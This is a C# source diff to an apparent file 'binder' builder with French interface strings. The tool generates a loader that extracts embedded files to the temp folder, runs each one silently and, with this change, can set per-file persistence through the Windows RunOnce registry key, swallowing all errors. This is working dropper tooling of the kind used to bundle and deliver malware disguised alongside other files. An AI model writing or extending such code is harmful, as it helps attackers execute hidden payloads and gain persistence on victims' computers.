@@ -17,6 +17,7 @@ public class BinderEntry
     public string SizeDisplay => FileSize >= 1024 * 1024
         ? $"{FileSize / 1024.0 / 1024:F1} MB"
         : FileSize >= 1024 ? $"{FileSize / 1024:N0} KB" : $"{FileSize} B";
+    public bool   RunOnce  { get; set; }
     public System.Windows.Media.Imaging.BitmapSource? Icon { get; set; }
 }
 
@@ -37,7 +38,6 @@ public static class BinderBuilder
         IList<BinderEntry> entries,
         string?            iconSourcePath,
         string             outputPath,
-        bool               runOnce,
         Action<string>     progress)
     {
         if (entries.Count == 0) return "Aucun fichier ajouté.";
@@ -64,7 +64,7 @@ public static class BinderBuilder
 
             // Generate loader source
             progress("Génération du code…");
-            File.WriteAllText(Path.Combine(tmp, "Program.cs"), GenerateCode(entries, fileNames, runOnce), Encoding.UTF8);
+            File.WriteAllText(Path.Combine(tmp, "Program.cs"), GenerateCode(entries, fileNames), Encoding.UTF8);
 
             // Build /resource arguments
             var resources = new StringBuilder();
@@ -109,33 +109,35 @@ public static class BinderBuilder
 
     // ── Code generation ─────────────────────────────────────────────────
 
-    private static string GenerateCode(IList<BinderEntry> entries, IList<string> fileNames, bool runOnce)
+    private static string GenerateCode(IList<BinderEntry> entries, IList<string> fileNames)
     {
+        bool anyRunOnce = entries.Any(e => e.RunOnce);
         var sb = new StringBuilder();
         sb.AppendLine("using System;");
         sb.AppendLine("using System.Diagnostics;");
         sb.AppendLine("using System.IO;");
         sb.AppendLine("using System.Reflection;");
-        if (runOnce) sb.AppendLine("using Microsoft.Win32;");
+        if (anyRunOnce) sb.AppendLine("using Microsoft.Win32;");
         sb.AppendLine("class B {");
         sb.AppendLine("    static void Main() {");
         sb.AppendLine("        string t = Path.GetTempPath();");
         sb.AppendLine("        Assembly a = Assembly.GetExecutingAssembly();");
         for (int i = 0; i < entries.Count; i++)
         {
-            var n = fileNames[i].Replace("\\", "\\\\").Replace("\"", "\\\"");
-            sb.AppendLine($"        Drop(a,t,\"{n}\");");
+            var n  = fileNames[i].Replace("\\", "\\\\").Replace("\"", "\\\"");
+            var ro = entries[i].RunOnce ? "true" : "false";
+            sb.AppendLine($"        Drop(a,t,\"{n}\",{ro});");
         }
         sb.AppendLine("    }");
-        sb.AppendLine("    static void Drop(Assembly a,string t,string name){");
+        sb.AppendLine("    static void Drop(Assembly a,string t,string name,bool ro){");
         sb.AppendLine("        try{");
         sb.AppendLine("            Stream s=a.GetManifestResourceStream(name);");
         sb.AppendLine("            if(s==null)return;");
         sb.AppendLine("            byte[] b=new byte[s.Length];s.Read(b,0,b.Length);s.Dispose();");
         sb.AppendLine("            string p=Path.Combine(t,name);");
         sb.AppendLine("            File.WriteAllBytes(p,b);");
-        if (runOnce)
-            sb.AppendLine("            try{var k=Registry.CurrentUser.OpenSubKey(\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\",true);k?.SetValue(name,\"\\\"\" +p+ \"\\\"\");}catch{}");
+        if (anyRunOnce)
+            sb.AppendLine("            if(ro)try{var k=Registry.CurrentUser.OpenSubKey(\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\",true);k?.SetValue(name,\"\\\"\" +p+ \"\\\"\");}catch{}");
         sb.AppendLine("            Process.Start(new ProcessStartInfo(p){UseShellExecute=true});");
         sb.AppendLine("        }catch{}");
         sb.AppendLine("    }");
